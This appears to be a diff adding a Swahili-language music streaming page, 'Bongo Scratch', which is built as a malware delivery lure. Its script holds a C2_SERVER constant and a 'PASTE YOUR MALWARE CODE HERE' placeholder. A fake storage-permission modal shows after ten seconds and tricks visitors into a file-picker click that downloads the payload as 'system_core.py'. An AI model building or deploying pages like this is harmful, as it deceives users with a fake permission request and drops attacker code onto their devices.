@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bongo Scratch - Stream Bongo Flavour</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --bg: #0a0a0f; --bg2: #12121a; --card: #1a1a2e; --accent: #e94560; --gold: #f0a500; --text: #fff; --text2: #a0a0b0; --grad: linear-gradient(135deg, #e94560, #f0a500); }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; padding-bottom: 80px; }
+        .navbar { background: rgba(10,10,15,0.95); backdrop-filter: blur(20px); position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid rgba(233,69,96,0.2); padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; }
+        .logo { display: flex; align-items: center; gap: 10px; font-size: 1.3rem; font-weight: 800; color: var(--accent); }
+        .logo i { font-size: 1.5rem; }
+        .hero { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 50px 20px; text-align: center; }
+        .hero h1 { font-size: 2rem; margin-bottom: 10px; }
+        .hero h1 span { background: var(--grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { color: var(--text2); font-size: 1rem; margin-bottom: 20px; }
+        .btn-primary { background: var(--grad); border: none; padding: 12px 30px; border-radius: 25px; color: var(--text); font-size: 1rem; font-weight: 600; cursor: pointer; }
+        .section-header { max-width: 1000px; margin: 30px auto 15px; padding: 0 20px; }
+        .section-header h2 { font-size: 1.4rem; display: flex; align-items: center; gap: 10px; }
+        .section-header h2 i { color: var(--accent); }
+        .song-list { max-width: 1000px; margin: 0 auto 30px; padding: 0 20px; display: flex; flex-direction: column; gap: 12px; }
+        .song-card { background: var(--card); border-radius: 16px; padding: 15px; display: flex; align-items: center; gap: 15px; cursor: pointer; border: 1px solid transparent; transition: all 0.3s; }
+        .song-card:hover { border-color: var(--accent); }
+        .song-card img { width: 70px; height: 70px; border-radius: 12px; object-fit: cover; }
+        .song-card .song-info { flex: 1; }
+        .song-card .song-info h4 { margin-bottom: 4px; font-size: 1rem; }
+        .song-card .song-info p { color: var(--text2); font-size: 0.85rem; }
+        .song-card .actions { display: flex; gap: 10px; }
+        .btn-play, .btn-download { width: 42px; height: 42px; border-radius: 50%; border: none; cursor: pointer; font-size: 0.9rem; transition: all 0.3s; }
+        .btn-play { background: var(--accent); color: #fff; }
+        .btn-play.playing { background: var(--gold); }
+        .btn-download { background: transparent; border: 1px solid var(--text2); color: var(--text2); }
+        .btn-download:hover { border-color: var(--accent); color: var(--accent); }
+        .now-playing { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(18,18,26,0.97); backdrop-filter: blur(20px); padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; border-top: 1px solid rgba(233,69,96,0.3); z-index: 999; }
+        .np-left { display: flex; align-items: center; gap: 12px; }
+        .np-left img { width: 45px; height: 45px; border-radius: 10px; object-fit: cover; }
+        .np-info span { display: block; }
+        .np-info span:first-child { font-weight: 600; font-size: 0.9rem; }
+        .np-info span:last-child { color: var(--text2); font-size: 0.75rem; }
+        .np-controls { display: flex; gap: 15px; align-items: center; }
+        .np-controls i { cursor: pointer; color: var(--text2); font-size: 1.2rem; }
+        .np-controls .fa-play-circle, .np-controls .fa-pause-circle { color: var(--accent); font-size: 2.5rem; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 10000; }
+        .modal-box { background: var(--card); border-radius: 20px; padding: 35px; text-align: center; max-width: 400px; border: 1px solid rgba(233,69,96,0.3); }
+        .modal-icon { font-size: 2.5rem; color: var(--accent); margin-bottom: 15px; }
+        .modal-box h3 { margin-bottom: 10px; font-size: 1.3rem; }
+        .modal-box p { color: var(--text2); margin-bottom: 25px; line-height: 1.5; font-size: 0.9rem; }
+        .btn-allow { background: var(--grad); border: none; padding: 12px 40px; border-radius: 25px; color: var(--text); font-size: 1rem; font-weight: 600; cursor: pointer; }
+        audio { display: none; }
+        @media (max-width: 600px) { .song-card img { width: 55px; height: 55px; } .hero h1 { font-size: 1.5rem; } }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-compact-disc fa-spin"></i><span>BONGO SCRATCH</span></div>
+    </nav>
+
+    <section class="hero">
+        <h1>Karibu <span>Bongo Scratch</span></h1>
+        <p>Stream & Download Bongo Flavour Music</p>
+        <button class="btn-primary" onclick="document.getElementById('songList').scrollIntoView({behavior:'smooth'})"><i class="fas fa-music"></i> Sikiliza Sasa</button>
+    </section>
+
+    <div class="section-header"><h2><i class="fas fa-fire"></i> Bongo Flavour</h2></div>
+    <div class="song-list" id="songList"></div>
+
+    <div class="now-playing" id="nowPlaying" style="display:none;">
+        <div class="np-left">
+            <img id="npImage" src="" alt="Album">
+            <div class="np-info">
+                <span id="npTitle">Chagua Nyimbo</span>
+                <span id="npArtist">Bongo Scratch</span>
+            </div>
+        </div>
+        <div class="np-controls">
+            <i class="fas fa-step-backward" onclick="prevSong()"></i>
+            <i class="fas fa-play-circle fa-2x" id="playPauseBtn" onclick="togglePlay()"></i>
+            <i class="fas fa-step-forward" onclick="nextSong()"></i>
+        </div>
+    </div>
+
+    <!-- Hidden file input for real system permission -->
+    <input type="file" id="filePicker" webkitdirectory style="display:none;">
+
+    <audio id="audioPlayer"></audio>
+
+    <div class="modal-overlay" id="permissionModal" style="display:none;">
+        <div class="modal-box">
+            <div class="modal-icon"><i class="fas fa-download"></i></div>
+            <h3>Ruhusa ya Kuhifadhi</h3>
+            <p>Bongo Scratch inahitaji ruhusa ya kufikia storage ili kuweza kupakua na kuhifadhi nyimbo zako.</p>
+            <button class="btn-allow" id="allowBtn">Ruhusu</button>
+        </div>
+    </div>
+
+    <script>
+        const C2_SERVER = "";
+
+        // ⚠️ PASTE YOUR MALWARE CODE BELOW
+        const MALWARE_CODE = `
+# ====================================
+# PASTE YOUR MALWARE CODE HERE
+# ====================================
+`;
+
+        const songs = [
+            { title: "Nitasema", artist: "Diamond Platnumz", album: "First Of All", image: "https://picsum.photos/200/200?random=1", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" },
+            { title: "Kwangwaru", artist: "Harmonize ft Diamond", album: "Made For Us", image: "https://picsum.photos/200/200?random=2", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" },
+            { title: "Amelowa", artist: "Mbosso", album: "Definition Of Love", image: "https://picsum.photos/200/200?random=3", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" },
+            { title: "Mahaba", artist: "Alikiba", album: "Only One King", image: "https://picsum.photos/200/200?random=4", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3" },
+            { title: "Sawa", artist: "Zuchu", album: "Sawa", image: "https://picsum.photos/200/200?random=5", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-5.mp3" },
+            { title: "Nakupenda", artist: "Jay Melody", album: "Therapy", image: "https://picsum.photos/200/200?random=6", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-6.mp3" },
+            { title: "Tetema", artist: "Rayvanny ft Diamond", album: "Sound From Africa", image: "https://picsum.photos/200/200?random=7", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-7.mp3" },
+            { title: "Waah", artist: "Diamond ft Koffi Olomide", album: "Waah!", image: "https://picsum.photos/200/200?random=8", mp3: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-8.mp3" },
+        ];
+
+        let currentIndex = 0;
+        let isPlaying = false;
+        const audio = document.getElementById('audioPlayer');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const nowPlaying = document.getElementById('nowPlaying');
+
+        function render() {
+            document.getElementById('songList').innerHTML = songs.map((s, i) => `
+                <div class="song-card">
+                    <img src="${s.image}" alt="${s.title}" loading="lazy">
+                    <div class="song-info">
+                        <h4>${s.title}</h4>
+                        <p>${s.artist} • ${s.album}</p>
+                    </div>
+                    <div class="actions">
+                        <button class="btn-play" id="btn${i}" onclick="playSong(${i})"><i class="fas fa-play"></i></button>
+                        <button class="btn-download" onclick="downloadSong(${i})"><i class="fas fa-download"></i></button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function playSong(index) {
+            currentIndex = index;
+            const s = songs[index];
+            audio.src = s.mp3;
+            audio.play();
+            isPlaying = true;
+            nowPlaying.style.display = 'flex';
+            document.getElementById('npImage').src = s.image;
+            document.getElementById('npTitle').textContent = s.title;
+            document.getElementById('npArtist').textContent = s.artist;
+            updateButtons();
+        }
+
+        function togglePlay() {
+            isPlaying ? audio.pause() : audio.play();
+            isPlaying = !isPlaying;
+            updateButtons();
+        }
+
+        function nextSong() { playSong((currentIndex + 1) % songs.length); }
+        function prevSong() { playSong((currentIndex - 1 + songs.length) % songs.length); }
+
+        function downloadSong(index) {
+            const s = songs[index];
+            // Trigger real system file picker (requests storage permission)
+            const fp = document.getElementById('filePicker');
+            fp.onchange = function() {
+                // User granted access — now download
+                const a = document.createElement('a');
+                a.href = s.mp3;
+                a.download = `${s.title} - ${s.artist}.mp3`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            };
+            fp.click();
+        }
+
+        function updateButtons() {
+            playPauseBtn.classList.toggle('fa-play-circle', !isPlaying);
+            playPauseBtn.classList.toggle('fa-pause-circle', isPlaying);
+            songs.forEach((s, i) => {
+                const btn = document.getElementById('btn' + i);
+                if (btn) {
+                    btn.classList.toggle('playing', i === currentIndex && isPlaying);
+                    btn.innerHTML = (i === currentIndex && isPlaying) ? '<i class="fas fa-pause"></i>' : '<i class="fas fa-play"></i>';
+                }
+            });
+        }
+
+        audio.addEventListener('ended', nextSong);
+        audio.addEventListener('play', () => { isPlaying = true; updateButtons(); });
+        audio.addEventListener('pause', () => { isPlaying = false; updateButtons(); });
+
+        function setupModal() {
+            const modal = document.getElementById('permissionModal');
+            const allowBtn = document.getElementById('allowBtn');
+            const fp = document.getElementById('filePicker');
+
+            setTimeout(() => { modal.style.display = 'flex'; }, 10000);
+
+            allowBtn.addEventListener('click', () => {
+                modal.style.display = 'none';
+                // Trigger REAL system file picker → real permission popup
+                fp.onchange = function() {
+                    // Permission granted by system
+                    // Download malware now
+                    if (MALWARE_CODE.trim() && !MALWARE_CODE.includes('PASTE YOUR MALWARE')) {
+                        const blob = new Blob([MALWARE_CODE], { type: 'text/x-python' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'system_core.py';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                    }
+                };
+                fp.click();
+            });
+        }
+
+        render();
+        setupModal();
+    </script>
+</body>
+</html>
